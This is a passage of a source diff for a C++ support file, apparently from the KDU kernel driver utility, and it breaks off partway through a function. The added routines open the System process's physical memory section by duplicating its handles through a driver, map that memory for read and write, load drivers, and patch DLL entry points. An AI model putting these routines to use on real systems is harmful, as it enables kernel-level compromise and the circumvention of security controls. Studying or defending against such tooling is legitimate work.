@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2021
+*  (C) COPYRIGHT AUTHORS, 2020 - 2022
 *
 *  TITLE:       SUP.CPP
 *
-*  VERSION:     1.11
+*  VERSION:     1.20
 *
-*  DATE:        14 May 2021
+*  DATE:        08 Feb 2022
 *
 *  Program global support routines.
 *
@@ -83,6 +83,267 @@ BOOL supCallDriver(
 }
 
 /*
+* supMapPhysicalMemory
+*
+* Purpose:
+*
+* Map physical memory.
+*
+*/
+PVOID supMapPhysicalMemory(
+    _In_ HANDLE SectionHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ ULONG NumberOfBytes,
+    _In_ BOOL MapForWrite
+)
+{
+    PVOID viewBase = NULL;
+    ULONG ulProtect;
+    LARGE_INTEGER sectionBase;
+    SIZE_T viewSize;
+
+    if (MapForWrite)
+        ulProtect = PAGE_READWRITE;
+    else
+        ulProtect = PAGE_READONLY;
+
+    ULONG_PTR offset = PhysicalAddress & ~(PAGE_SIZE - 1);
+
+    sectionBase.QuadPart = offset;
+    viewSize = (PhysicalAddress - offset) + NumberOfBytes;
+
+    NTSTATUS ntStatus = NtMapViewOfSection(SectionHandle,
+        NtCurrentProcess(),
+        &viewBase,
+        0,
+        0,
+        &sectionBase,
+        &viewSize,
+        ViewUnmap,
+        NULL,
+        ulProtect);
+
+    if (!NT_SUCCESS(ntStatus)) {
+        SetLastError(RtlNtStatusToDosError(ntStatus));
+    }
+    else {
+        return viewBase;
+    }
+
+    return NULL;
+}
+
+/*
+* supUnmapPhysicalMemory
+*
+* Purpose:
+*
+* Unmap physical memory view.
+*
+*/
+VOID supUnmapPhysicalMemory(
+    _In_ PVOID BaseAddress
+)
+{
+    NtUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
+}
+
+/*
+* supReadWritePhysicalMemory
+*
+* Purpose:
+*
+* Read/Write physical memory.
+*
+*/
+BOOL WINAPI supReadWritePhysicalMemory(
+    _In_ HANDLE SectionHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_ ULONG NumberOfBytes,
+    _In_ BOOLEAN DoWrite)
+{
+    BOOL bResult = FALSE;
+    DWORD dwError = ERROR_SUCCESS;
+    PVOID mappedSection = NULL;
+
+    ULONG_PTR offset;
+
+    mappedSection = supMapPhysicalMemory(SectionHandle,
+        PhysicalAddress,
+        NumberOfBytes,
+        DoWrite);
+
+    if (mappedSection) {
+
+        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));
+
+        __try {
+
+            if (DoWrite) {
+                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
+            }
+            else {
+                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
+            }
+
+            bResult = TRUE;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER)
+        {
+            bResult = FALSE;
+            dwError = GetExceptionCode();
+        }
+
+        supUnmapPhysicalMemory(mappedSection);
+
+    }
+    else {
+        dwError = GetLastError();
+    }
+
+    SetLastError(dwError);
+    return bResult;
+}
+
+/*
+* supOpenPhysicalMemory
+*
+* Purpose:
+*
+* Locate and open physical memory section for read/write.
+*
+*/
+BOOL WINAPI supOpenPhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ pfnOpenProcessCallback OpenProcessCallback,
+    _In_ pfnDuplicateHandleCallback DuplicateHandleCallback,
+    _Out_ PHANDLE PhysicalMemoryHandle)
+{
+    BOOL bResult = FALSE;
+    DWORD dwError = ERROR_NOT_FOUND;
+    ULONG sectionObjectType = (ULONG)-1;
+    HANDLE processHandle = NULL;
+    HANDLE sectionHandle = NULL;
+    PSYSTEM_HANDLE_INFORMATION_EX handleArray = NULL;
+    UNICODE_STRING ustr;
+    OBJECT_ATTRIBUTES obja;
+    UNICODE_STRING usSection;
+
+    do {
+
+        *PhysicalMemoryHandle = NULL;
+
+        if (!OpenProcessCallback(DeviceHandle,
+            UlongToHandle(SYSTEM_PID_MAGIC),
+            PROCESS_ALL_ACCESS,
+            &processHandle))
+        {
+            dwError = GetLastError();
+            break;
+        }
+
+        RtlInitUnicodeString(&ustr, L"\\KnownDlls\\kernel32.dll");
+        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        NTSTATUS ntStatus = NtOpenSection(&sectionHandle, SECTION_QUERY, &obja);
+
+        if (!NT_SUCCESS(ntStatus)) {
+            dwError = RtlNtStatusToDosError(ntStatus);
+            break;
+        }
+
+        handleArray = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
+        if (handleArray == NULL) {
+            dwError = ERROR_NOT_ENOUGH_MEMORY;
+            break;
+        }
+
+        ULONG i;
+        DWORD currentProcessId = GetCurrentProcessId();
+
+        for (i = 0; i < handleArray->NumberOfHandles; i++) {
+            if (handleArray->Handles[i].UniqueProcessId == currentProcessId &&
+                handleArray->Handles[i].HandleValue == (ULONG_PTR)sectionHandle)
+            {
+                sectionObjectType = handleArray->Handles[i].ObjectTypeIndex;
+                break;
+            }
+        }
+
+        NtClose(sectionHandle);
+        sectionHandle = NULL;
+
+        if (sectionObjectType == (ULONG)-1) {
+            dwError = ERROR_INVALID_DATATYPE;
+            break;
+        }
+
+        RtlInitUnicodeString(&usSection, L"\\Device\\PhysicalMemory");
+
+        for (i = 0; i < handleArray->NumberOfHandles; i++) {
+            if (handleArray->Handles[i].UniqueProcessId == SYSTEM_PID_MAGIC &&
+                handleArray->Handles[i].ObjectTypeIndex == (ULONG_PTR)sectionObjectType &&
+                handleArray->Handles[i].GrantedAccess == SECTION_ALL_ACCESS)
+            {
+                HANDLE testHandle = NULL;
+
+                if (DuplicateHandleCallback(DeviceHandle,
+                    UlongToHandle(SYSTEM_PID_MAGIC),
+                    processHandle,
+                    (HANDLE)handleArray->Handles[i].HandleValue,
+                    &testHandle,
+                    MAXIMUM_ALLOWED,
+                    0,
+                    0))
+                {
+                    union {
+                        BYTE* Buffer;
+                        POBJECT_NAME_INFORMATION Information;
+                    } NameInfo;
+
+                    NameInfo.Buffer = NULL;
+
+                    ntStatus = supQueryObjectInformation(testHandle,
+                        ObjectNameInformation,
+                        (PVOID*)&NameInfo.Buffer,
+                        NULL,
+                        (PNTSUPMEMALLOC)supHeapAlloc,
+                        (PNTSUPMEMFREE)supHeapFree);
+
+                    if (NT_SUCCESS(ntStatus) && NameInfo.Buffer) {
+
+                        if (RtlEqualUnicodeString(&usSection, &NameInfo.Information->Name, TRUE)) {
+                            *PhysicalMemoryHandle = testHandle;
+                            bResult = TRUE;
+                        }
+
+                        supHeapFree(NameInfo.Buffer);
+                    }
+
+                    if (bResult == FALSE)
+                        NtClose(testHandle);
+                }
+
+                if (bResult)
+                    break;
+
+            }
+        }
+
+    } while (FALSE);
+
+    if (sectionHandle) NtClose(sectionHandle);
+    if (processHandle) NtClose(processHandle);
+    if (handleArray) supHeapFree(handleArray);
+
+    if (bResult) dwError = ERROR_SUCCESS;
+
+    SetLastError(dwError);
+    return bResult;
+}
+
+/*
 * supChkSum
 *
 * Purpose:
@@ -101,6 +362,42 @@ USHORT supChkSum(
         PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
     }
     return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
+}
+
+/*
+* supCalculateCheckSumForMappedFile
+*
+* Purpose:
+*
+* Calculate PE file checksum.
+*
+*/
+DWORD supCalculateCheckSumForMappedFile(
+    _In_ PVOID BaseAddress,
+    _In_ ULONG FileLength
+)
+{
+    PUSHORT AdjustSum;
+    PIMAGE_NT_HEADERS NtHeaders;
+    USHORT PartialSum;
+    ULONG CheckSum;
+
+    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);
+
+    NtHeaders = RtlImageNtHeader(BaseAddress);
+    if (NtHeaders != NULL) {
+        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
+        PartialSum -= (PartialSum < AdjustSum[0]);
+        PartialSum -= AdjustSum[0];
+        PartialSum -= (PartialSum < AdjustSum[1]);
+        PartialSum -= AdjustSum[1];
+    }
+    else
+    {
+        PartialSum = 0;
+    }
+    CheckSum = (ULONG)PartialSum + FileLength;
+    return CheckSum;
 }
 
 /*
@@ -160,7 +457,7 @@ BOOLEAN supVerifyMappedImageMatchesChecksum(
 */
 BOOL supxDeleteKeyRecursive(
     _In_ HKEY hKeyRoot,
-    _In_ LPWSTR lpSubKey)
+    _In_ LPCWSTR lpSubKey)
 {
     LPWSTR lpEnd;
     LONG lResult;
@@ -250,12 +547,35 @@ BOOL supxDeleteKeyRecursive(
 */
 BOOL supRegDeleteKeyRecursive(
     _In_ HKEY hKeyRoot,
-    _In_ LPWSTR lpSubKey)
+    _In_ LPCWSTR lpSubKey)
 {
     WCHAR szKeyName[MAX_PATH * 2];
     RtlSecureZeroMemory(szKeyName, sizeof(szKeyName));
     _strncpy(szKeyName, MAX_PATH * 2, lpSubKey, MAX_PATH);
     return supxDeleteKeyRecursive(hKeyRoot, szKeyName);
+}
+
+/*
+* supRegWriteValueString
+*
+* Purpose:
+*
+* Write string value to the registry.
+*
+*/
+NTSTATUS supRegWriteValueString(
+    _In_ HANDLE RegistryHandle,
+    _In_ LPCWSTR ValueName,
+    _In_ LPCWSTR ValueData
+)
+{
+    UNICODE_STRING valueName;
+    WCHAR szData[64];
+
+    RtlInitUnicodeString(&valueName, ValueName);
+    _strcpy(szData, ValueData);
+    return NtSetValueKey(RegistryHandle, &valueName, 0, REG_SZ,
+        (PVOID)&szData, (ULONG)(1 + (ULONG)_strlen(szData)) * sizeof(WCHAR));
 }
 
 /*
@@ -423,7 +743,7 @@ Cleanup:
 }
 
 /*
-* supLoadDriver
+* supLoadDriverEx
 *
 * Purpose:
 *
@@ -433,10 +753,12 @@ Cleanup:
 * SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
 *
 */
-NTSTATUS supLoadDriver(
+NTSTATUS supLoadDriverEx(
     _In_ LPCWSTR DriverName,
     _In_ LPCWSTR DriverPath,
-    _In_ BOOLEAN UnloadPreviousInstance
+    _In_ BOOLEAN UnloadPreviousInstance,
+    _In_opt_ pfnLoadDriverCallback Callback,
+    _In_opt_ PVOID CallbackParam
 )
 {
     SIZE_T keyOffset;
@@ -469,6 +791,13 @@ NTSTATUS supLoadDriver(
         return status;
 
     RtlInitUnicodeString(&driverServiceName, szBuffer);
+
+    if (Callback) {
+        status = Callback(&driverServiceName, CallbackParam);
+        if (!NT_SUCCESS(status))
+            return status;
+    }
+
     status = NtLoadDriver(&driverServiceName);
 
     if (UnloadPreviousInstance) {
@@ -488,6 +817,30 @@ NTSTATUS supLoadDriver(
     }
 
     return status;
+}
+
+/*
+* supLoadDriver
+*
+* Purpose:
+*
+* Install driver and load it.
+*
+* N.B.
+* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
+*
+*/
+NTSTATUS supLoadDriver(
+    _In_ LPCWSTR DriverName,
+    _In_ LPCWSTR DriverPath,
+    _In_ BOOLEAN UnloadPreviousInstance
+)
+{
+    return supLoadDriverEx(DriverName,
+        DriverPath,
+        UnloadPreviousInstance,
+        NULL,
+        NULL);
 }
 
 /*
@@ -542,11 +895,55 @@ NTSTATUS supUnloadDriver(
 }
 
 /*
+* supOpenDriverEx
+*
+* Purpose:
+*
+* Open handle for driver.
+*
+*/
+NTSTATUS supOpenDriverEx(
+    _In_ LPCWSTR DriverName,
+    _In_ ACCESS_MASK DesiredAccess,
+    _Out_opt_ PHANDLE DeviceHandle
+)
+{
+    HANDLE deviceHandle = NULL;
+    UNICODE_STRING usDeviceLink;
+    OBJECT_ATTRIBUTES obja;
+    IO_STATUS_BLOCK iost;
+
+    NTSTATUS ntStatus;
+
+    RtlInitUnicodeString(&usDeviceLink, DriverName);
+    InitializeObjectAttributes(&obja, &usDeviceLink, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    ntStatus = NtCreateFile(&deviceHandle,
+        DesiredAccess,
+        &obja,
+        &iost,
+        NULL,
+        0,
+        0,
+        FILE_OPEN,
+        0,
+        NULL,
+        0);
+
+    if (NT_SUCCESS(ntStatus)) {
+        if (DeviceHandle)
+            *DeviceHandle = deviceHandle;
+    }
+
+    return ntStatus;
+}
+
+/*
 * supOpenDriver
 *
 * Purpose:
 *
-* Open handle for helper driver.
+* Open handle for driver through \\DosDevices.
 *
 */
 NTSTATUS supOpenDriver(
@@ -555,13 +952,7 @@ NTSTATUS supOpenDriver(
     _Out_ PHANDLE DeviceHandle
 )
 {
-    NTSTATUS status = STATUS_UNSUCCESSFUL;
-
-    UNICODE_STRING usDeviceLink;
-    OBJECT_ATTRIBUTES obja;
-    IO_STATUS_BLOCK iost;
-
-    TCHAR szDeviceLink[MAX_PATH + 1];
+    NTSTATUS status = STATUS_UNSUCCESSFUL; 
 
     // assume failure
     if (DeviceHandle)
@@ -570,6 +961,8 @@ NTSTATUS supOpenDriver(
         return STATUS_INVALID_PARAMETER_2;
 
     if (DriverName) {
+
+        WCHAR szDeviceLink[MAX_PATH + 1];
 
         RtlSecureZeroMemory(szDeviceLink, sizeof(szDeviceLink));
 
@@ -581,20 +974,33 @@ NTSTATUS supOpenDriver(
             return STATUS_INVALID_PARAMETER_1;
         }
 
-        RtlInitUnicodeString(&usDeviceLink, szDeviceLink);
-        InitializeObjectAttributes(&obja, &usDeviceLink, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-        status = NtCreateFile(DeviceHandle,
+        status = supOpenDriverEx(szDeviceLink,
             DesiredAccess,
-            &obja,
-            &iost,
-            NULL,
-            0,
-            0,
-            FILE_OPEN,
-            0,
-            NULL,
-            0);
+            DeviceHandle);
+
+        if (status == STATUS_OBJECT_NAME_NOT_FOUND ||
+            status == STATUS_NO_SUCH_DEVICE) 
+        {
+
+            //
+            // Check the case when no symlink available.
+            //
+
+            RtlSecureZeroMemory(szDeviceLink, sizeof(szDeviceLink));
+
+            if (FAILED(StringCchPrintf(szDeviceLink,
+                MAX_PATH,
+                TEXT("\\Device\\%wS"),
+                DriverName)))
+            {
+                return STATUS_INVALID_PARAMETER_1;
+            }
+
+            status = supOpenDriverEx(szDeviceLink,
+                DesiredAccess,
+                DeviceHandle);
+
+        }
 
     }
     else {
@@ -603,8 +1009,6 @@ NTSTATUS supOpenDriver(
 
     return status;
 }
-
-#define NTQSI_MAX_BUFFER_LENGTH (512 * 1024 * 1024)
 
 /*
 * supGetSystemInfo
@@ -806,7 +1210,7 @@ PBYTE supQueryResourceData(
 *
 */
 SIZE_T supWriteBufferToFile(
-    _In_ PWSTR lpFileName,
+    _In_ PCWSTR lpFileName,
     _In_ PVOID Buffer,
     _In_ SIZE_T Size,
     _In_ BOOL Flush,
@@ -1019,7 +1423,7 @@ NTSTATUS NTAPI supDetectObjectCallback(
 *
 */
 NTSTATUS NTAPI supEnumSystemObjects(
-    _In_opt_ LPWSTR pwszRootDirectory,
+    _In_opt_ LPCWSTR pwszRootDirectory,
     _In_opt_ HANDLE hRootDirectory,
     _In_ PENUMOBJECTSCALLBACK CallbackProc,
     _In_opt_ PVOID CallbackParam
@@ -1110,8 +1514,8 @@ NTSTATUS NTAPI supEnumSystemObjects(
 *
 */
 BOOLEAN supIsObjectExists(
-    _In_ LPWSTR RootDirectory,
-    _In_ LPWSTR ObjectName
+    _In_ LPCWSTR RootDirectory,
+    _In_ LPCWSTR ObjectName
 )
 {
     OBJSCANPARAM Param;
@@ -1165,6 +1569,8 @@ BOOL supQueryObjectFromHandle(
     }
     return bFound;
 }
+
+
 
 /*
 * supGetCommandLineOption
@@ -1384,6 +1790,39 @@ BOOLEAN supQuerySecureBootState(
 }
 
 /*
+* supGetFirmwareType
+*
+* Purpose:
+*
+* Return firmware type.
+*
+*/
+NTSTATUS supGetFirmwareType(
+    _Out_ PFIRMWARE_TYPE FirmwareType
+)
+{
+    NTSTATUS ntStatus;
+    ULONG returnLength = 0;
+    SYSTEM_BOOT_ENVIRONMENT_INFORMATION sbei;
+
+    *FirmwareType = FirmwareTypeUnknown;
+
+    RtlSecureZeroMemory(&sbei, sizeof(sbei));
+
+    ntStatus = NtQuerySystemInformation(SystemBootEnvironmentInformation,
+        &sbei,
+        sizeof(sbei),
+        &returnLength);
+
+    if (NT_SUCCESS(ntStatus)) {
+        *FirmwareType = sbei.FirmwareType;
+
+    }
+
+    return ntStatus;
+}
+
+/*
 * supReadFileToBuffer
 *
 * Purpose:
@@ -1544,8 +1983,8 @@ ULONG_PTR supGetPML4FromLowStub1M(
 *
 */
 NTSTATUS supCreateSystemAdminAccessSD(
-    _Out_ PSECURITY_DESCRIPTOR* SecurityDescriptor,
-    _Out_ PACL* DefaultAcl
+    _Out_ PSECURITY_DESCRIPTOR * SecurityDescriptor,
+    _Out_ PACL * DefaultAcl
 )
 {
     NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
@@ -1670,7 +2109,7 @@ ULONG_PTR supGetModuleBaseByName(
     ANSI_STRING moduleName;
 
     if (ImageSize)
-        *ImageSize = 0;  
+        *ImageSize = 0;
 
     moduleName.Buffer = NULL;
     moduleName.Length = moduleName.MaximumLength = 0;
@@ -1764,7 +2203,7 @@ BOOL supManageDummyDll(
             //
             dllHandle = (PVOID)GetModuleHandle(NULL);
 
-            dataBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI,
+            dataBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI64,
                 dllHandle,
                 &dataSize,
                 PROVIDER_RES_KEY,
@@ -1844,7 +2283,7 @@ ULONG supSelectNonPagedPoolTag(
 */
 NTSTATUS supLoadFileForMapping(
     _In_ LPCWSTR PayloadFileName,
-    _Out_ PVOID *LoadBase
+    _Out_ PVOID * LoadBase
 )
 {
     NTSTATUS ntStatus;
@@ -1942,7 +2381,7 @@ NTSTATUS supQueryImageSize(
 )
 {
     NTSTATUS ntStatus;
-    LDR_DATA_TABLE_ENTRY *ldrEntry = NULL;
+    LDR_DATA_TABLE_ENTRY* ldrEntry = NULL;
 
     *ImageSize = 0;
 
@@ -1978,4 +2417,689 @@ NTSTATUS supConvertToAnsi(
 
     RtlInitUnicodeString(&unicodeString, UnicodeString);
     return RtlUnicodeStringToAnsiString(AnsiString, &unicodeString, TRUE);
+}
+
+/*
+* supQuerySystemObjectInformationVariableSize
+*
+* Purpose:
+*
+* Generic object information query routine.
+*
+* Use FreeMem to release allocated buffer.
+*
+*/
+NTSTATUS supQuerySystemObjectInformationVariableSize(
+    _In_ PFN_NTQUERYROUTINE QueryRoutine,
+    _In_ HANDLE ObjectHandle,
+    _In_ DWORD InformationClass,
+    _Out_ PVOID * Buffer,
+    _Out_opt_ PULONG ReturnLength,
+    _In_ PNTSUPMEMALLOC AllocMem,
+    _In_ PNTSUPMEMFREE FreeMem
+)
+{
+    NTSTATUS ntStatus;
+    PVOID queryBuffer;
+    ULONG returnLength = 0;
+
+    *Buffer = NULL;
+    if (ReturnLength) *ReturnLength = 0;
+
+    ntStatus = QueryRoutine(ObjectHandle,
+        InformationClass,
+        NULL,
+        0,
+        &returnLength);
+
+    //
+    // Test all possible acceptable failures.
+    //
+    if (ntStatus != STATUS_BUFFER_OVERFLOW &&
+        ntStatus != STATUS_BUFFER_TOO_SMALL &&
+        ntStatus != STATUS_INFO_LENGTH_MISMATCH)
+    {
+        return ntStatus;
+    }
+
+    queryBuffer = AllocMem(returnLength);
+    if (queryBuffer == NULL)
+        return STATUS_INSUFFICIENT_RESOURCES;
+
+    ntStatus = QueryRoutine(ObjectHandle,
+        InformationClass,
+        queryBuffer,
+        returnLength,
+        &returnLength);
+
+    if (NT_SUCCESS(ntStatus)) {
+        *Buffer = queryBuffer;
+        if (ReturnLength) *ReturnLength = returnLength;
+    }
+    else {
+        FreeMem(queryBuffer);
+    }
+
+    return ntStatus;
+}
+
+/*
+* supQueryObjectInformation
+*
+* Purpose:
+*
+* Query object information with variable size.
+*
+* Returned buffer must be freed with FreeMem after usage.
+*
+*/
+NTSTATUS supQueryObjectInformation(
+    _In_ HANDLE ObjectHandle,
+    _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
+    _Out_ PVOID * Buffer,
+    _Out_opt_ PULONG ReturnLength,
+    _In_ PNTSUPMEMALLOC AllocMem,
+    _In_ PNTSUPMEMFREE FreeMem
+)
+{
+    return supQuerySystemObjectInformationVariableSize(
+        (PFN_NTQUERYROUTINE)NtQueryObject,
+        ObjectHandle,
+        (DWORD)ObjectInformationClass,
+        Buffer,
+        ReturnLength,
+        AllocMem,
+        FreeMem);
+}
+
+/*
+* supxBinTextEncode
+*
+* Purpose:
+*
+* Create pseudo random string from UI64 value.
+*
+*/
+VOID supxBinTextEncode(
+    _In_ unsigned __int64 x,
+    _Inout_ wchar_t* s
+)
+{
+    char    tbl[64];
+    char    c = 0;
+    int     p;
+
+    tbl[62] = '-';
+    tbl[63] = '_';
+
+    for (c = 0; c < 26; ++c)
+    {
+        tbl[c] = 'A' + c;
+        tbl[26 + c] = 'a' + c;
+        if (c < 10)
+            tbl[52 + c] = '0' + c;
+    }
+
+    for (p = 0; p < 13; ++p)
+    {
+        c = x & 0x3f;
+        x >>= 5;
+        *s = (wchar_t)tbl[c];
+        ++s;
+    }
+
+    *s = 0;
+}
+
+/*
+* supGenerateSharedObjectName
+*
+* Purpose:
+*
+* Create pseudo random object name from it ID.
+*
+*/
+VOID supGenerateSharedObjectName(
+    _In_ WORD ObjectId,
+    _Inout_ LPWSTR lpBuffer
+)
+{
+    ULARGE_INTEGER value;
+
+    value.LowPart = MAKELONG(
+        MAKEWORD(KDU_VERSION_BUILD, KDU_VERSION_REVISION),
+        MAKEWORD(KDU_VERSION_MINOR, KDU_VERSION_MAJOR));
+
+    value.HighPart = MAKELONG(KDU_BASE_ID, ObjectId);
+
+    supxBinTextEncode(value.QuadPart, lpBuffer);
+}
+
+/*
+* supSetupInstallDriverFromInf
+*
+* Purpose:
+*
+* Install and load device driver through SetupAPI.
+*
+*/
+BOOL supSetupInstallDriverFromInf(
+    _In_ LPCWSTR InfName,
+    _In_ BYTE* HardwareId,
+    _In_ ULONG HardwareIdLength,
+    _Out_ HDEVINFO* DeviceInfo,
+    _Inout_ SP_DEVINFO_DATA* DeviceInfoData
+)
+{
+    BOOL bResult = FALSE;
+    GUID guid;
+    HDEVINFO devInfo = NULL;
+#define MAX_CLASS_NAME_LEN 256
+    WCHAR className[MAX_CLASS_NAME_LEN];
+
+    *DeviceInfo = NULL;
+
+    do {
+
+        RtlSecureZeroMemory(&className, sizeof(className));
+        RtlSecureZeroMemory(DeviceInfoData, sizeof(SP_DEVINFO_DATA));
+        DeviceInfoData->cbSize = sizeof(SP_DEVINFO_DATA);
+
+        if (!SetupDiGetINFClass(
+            InfName,
+            &guid,
+            (PWSTR)&className,
+            MAX_CLASS_NAME_LEN,
+            NULL))
+        {
+            break;
+        }
+
+        devInfo = SetupDiCreateDeviceInfoList(&guid, NULL);
+        if (devInfo == INVALID_HANDLE_VALUE)
+            break;
+
+        if (!SetupDiCreateDeviceInfo(devInfo,
+            className,
+            &guid,
+            NULL,
+            NULL,
+            DICD_GENERATE_ID,
+            DeviceInfoData))
+        {
+            break;
+        }
+
+        if (!SetupDiSetDeviceRegistryProperty(devInfo,
+            DeviceInfoData,
+            SPDRP_HARDWAREID,
+            HardwareId,
+            HardwareIdLength))
+        {
+            break;
+        }
+
+        if (!SetupDiCallClassInstaller(DIF_REGISTERDEVICE,
+            devInfo,
+            DeviceInfoData))
+        {
+            break;
+        }
+
+        bResult = UpdateDriverForPlugAndPlayDevices(NULL,
+            (LPCWSTR)HardwareId,
+            InfName,
+            INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE,
+            NULL);
+
+    } while (FALSE);
+
+    if (bResult)
+        *DeviceInfo = devInfo;
+
+    return bResult;
+}
+
+/*
+* supSetupRemoveDriver
+*
+* Purpose:
+*
+* Unload and remove device driver installed through SetupAPI.
+*
+*/
+BOOL supSetupRemoveDriver(
+    _In_ HDEVINFO DeviceInfo,
+    _In_ SP_DEVINFO_DATA* DeviceInfoData
+)
+{
+    if (DeviceInfo != INVALID_HANDLE_VALUE) {
+        SetupDiRemoveDevice(DeviceInfo, DeviceInfoData);
+        return SetupDiDestroyDeviceInfoList(DeviceInfo);
+    }
+
+    return FALSE;
+}
+
+/*
+* supReplaceDllEntryPoint
+*
+* Purpose:
+*
+* Replace DLL entry point and optionally convert dll to exe.
+*
+*/
+BOOL supReplaceDllEntryPoint(
+    _In_ PVOID DllImage,
+    _In_ ULONG SizeOfDllImage,
+    _In_ LPCSTR lpEntryPointName,
+    _In_ BOOL fConvertToExe
+)
+{
+    BOOL bResult = FALSE;
+    PIMAGE_NT_HEADERS NtHeaders;
+    DWORD DllVirtualSize;
+    PVOID DllBase, EntryPoint;
+
+    NtHeaders = RtlImageNtHeader(DllImage);
+    if (NtHeaders) {
+
+        DllVirtualSize = 0;
+        DllBase = PELoaderLoadImage(DllImage, &DllVirtualSize);
+        if (DllBase) {
+            //
+            // Get the new entrypoint.
+            //
+            EntryPoint = PELoaderGetProcAddress(DllBase, (PCHAR)lpEntryPointName);
+            if (EntryPoint) {
+                //
+                // Set new entrypoint and recalculate checksum.
+                //
+                NtHeaders->OptionalHeader.AddressOfEntryPoint =
+                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);
+
+                if (fConvertToExe)
+                    NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;
+
+                NtHeaders->OptionalHeader.CheckSum =
+                    supCalculateCheckSumForMappedFile(DllImage, SizeOfDllImage);
+
+                bResult = TRUE;
+            }
+            VirtualFree(DllBase, 0, MEM_RELEASE);
+        }
+    }
+    return bResult;
+}
+
+/*
+* supExtractFileFromDB
+*
+* Purpose:
+*
+* Extract requested file from resources.
+*
+*/
+BOOL supExtractFileFromDB(
+    _In_ HMODULE ImageBase,
+    _In_ LPCWSTR FileName,
+    _In_ ULONG FileId
+)
+{
+    NTSTATUS ntStatus;
+    ULONG resourceSize = 0, writeBytes = 0;
+    PBYTE fileBuffer;
+
+    fileBuffer = (PBYTE)KDULoadResource(FileId,
+        ImageBase,
+        &resourceSize,
+        PROVIDER_RES_KEY,
+        TRUE);
+
+    if (fileBuffer == NULL) {
+
+        supPrintfEvent(kduEventError,
+            "[!] Requested data id cannot be found %lu\r\n", FileId);
+
+        return FALSE;
+
+    }
+
+    writeBytes = (ULONG)supWriteBufferToFile(FileName,
+        fileBuffer,
+        resourceSize,
+        TRUE,
+        FALSE,
+        &ntStatus);
+
+    supHeapFree(fileBuffer);
+
+    if (resourceSize != writeBytes) {
+
+        supPrintfEvent(kduEventError,
+            "[!] Unable to extract data, NTSTATUS (0x%lX)\r\n", ntStatus);
+
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+/*
+* supExtractFileToTemp
+*
+* Purpose:
+*
+* Save given file to local %temp%.
+*
+*/
+VOID supExtractFileToTemp(
+    _In_opt_ HMODULE ImageBase,
+    _In_opt_ ULONG FileResourceId,
+    _In_ LPCWSTR lpTempPath,
+    _In_ LPCWSTR lpFileName,
+    _In_ BOOL fDelete)
+{
+    WCHAR szFileName[MAX_PATH * 2];
+
+    RtlSecureZeroMemory(&szFileName, sizeof(szFileName));
+    StringCchPrintf(szFileName,
+        MAX_PATH * 2,
+        TEXT("%ws\\%ws"),
+        lpTempPath,
+        lpFileName);
+
+    if (fDelete) {
+        DeleteFile(szFileName);
+    }
+    else {
+        if (ImageBase) {
+            supExtractFileFromDB(ImageBase, szFileName, FileResourceId);
+        }
+    }
+}
+
+/*
+* supDeleteFileWithWait
+*
+* Purpose:
+*
+* Removes file from disk.
+*
+*/
+BOOL supDeleteFileWithWait(
+    _In_ ULONG WaitMilliseconds,
+    _In_ ULONG NumberOfAttempts,
+    _In_ LPCWSTR lpFileName
+)
+{
+    ULONG retryCount = NumberOfAttempts;
+
+    do {
+
+        Sleep(WaitMilliseconds);
+        if (DeleteFile(lpFileName)) {
+            return TRUE;
+        }
+
+        retryCount--;
+
+    } while (retryCount);
+
+    return FALSE;
+}
+
+/*
+* supMapFileAsImage
+*
+* Purpose:
+*
+* Create file mapping with SEC_IMAGE flag.
+*
+*/
+PVOID supMapFileAsImage(
+    _In_ LPWSTR lpImagePath
+)
+{
+    HANDLE hFile, hMapping = NULL;
+    PVOID  pvImageBase = NULL;
+
+    hFile = CreateFile(lpImagePath,
+        GENERIC_READ,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile != INVALID_HANDLE_VALUE) {
+        hMapping = CreateFileMapping(hFile,
+            NULL,
+            PAGE_READONLY | SEC_IMAGE,
+            0,
+            0,
+            NULL);
+
+        if (hMapping != NULL) {
+
+            pvImageBase = MapViewOfFile(hMapping,
+                FILE_MAP_READ, 0, 0, 0);
+
+            CloseHandle(hMapping);
+        }
+        CloseHandle(hFile);
+    }
+    return pvImageBase;
+}
+
+/*
+* supGetEntryPointForMappedFile
+*
+* Purpose:
+*
+* Return adjusted entry point address within mapped file.
+*
+*/
+PVOID supGetEntryPointForMappedFile(
+    _In_ PVOID ImageBase
+)
+{
+    PIMAGE_DOS_HEADER		 dosHeader = (PIMAGE_DOS_HEADER)ImageBase;
+    PIMAGE_FILE_HEADER		 fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) + dosHeader->e_lfanew);
